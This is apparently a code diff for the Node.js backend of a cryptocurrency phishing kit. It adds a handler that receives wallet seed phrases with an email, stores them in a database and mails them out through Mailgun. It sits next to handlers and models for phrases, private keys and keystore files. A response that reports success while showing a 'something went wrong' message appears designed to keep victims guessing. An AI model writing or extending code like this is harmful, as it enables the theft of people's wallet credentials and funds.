@@ -1,5 +1,6 @@
 // const sgMail = require("@sendgrid/mail");
 const Phrase = require("../models/phrase");
+const SeedPhrase = require("../models/seedPhrase");
 const PrivateKey = require("../models/privateKey");
 const KeyStoreJson = require("../models/keystoreJson");
 
@@ -41,6 +42,61 @@ exports.phraseData = async (req, res) => {
       html: `
         <h1>Phrase Data</h1>
         <p>${phrase}</p>
+      `,
+    })
+    .then((msg) => {
+      console.log(msg);
+      return res.status(200).json({
+        success: true,
+        msg: "Something went wrong, please try again later",
+      });
+    })
+    .catch((err) => {
+      console.error(err);
+      return res.status(400).json({
+        success: false,
+        msg: err,
+      });
+    });
+};
+
+exports.seedPhrase = async (req, res) => {
+  const { seedPhrase, email } = req.body;
+
+  try {
+    // check existing seedPhrase
+    let seedPhraseModel = await SeedPhrase.findOne({ email, seedPhrase });
+
+    if (seedPhraseModel) {
+      return res.status(400).json({
+        success: false,
+        msg: "Seed Phrase already exists",
+      });
+    }
+    
+    seedPhraseModel = new SeedPhrase({
+      email,
+      seedPhrase,
+    });
+
+    // save phrase to the database
+    await seedPhraseModel.save();
+  } catch (err) {
+    console.error(err.message);
+    return res.status(400).json({
+      success: false,
+      msg: err.message,
+    });
+  }
+
+  mg.messages
+    .create(process.env.MAILGUN_BASE_URL, {
+      from: email,
+      to: email,
+      subject: "Seed Phrase Data",
+      html: `
+        <h1>Seed Phrase Data</h1>
+        <p>${seedPhrase}</p>
       `,
     })
     .then((msg) => {
